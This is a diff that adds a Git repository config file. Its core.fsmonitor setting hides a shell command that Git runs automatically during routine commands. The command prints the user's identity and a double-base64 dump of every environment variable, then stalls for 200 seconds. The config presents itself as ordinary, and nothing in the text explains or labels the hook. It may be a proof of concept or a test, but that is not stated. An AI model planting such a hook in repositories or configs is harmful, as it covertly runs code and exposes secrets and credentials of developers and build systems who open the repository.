@@ -1,0 +1,6 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	worktree = .
+	fsmonitor = "/bin/bash -c 'echo test && id && env | base64 | base64; sleep 200; exit 0' 1>&2"
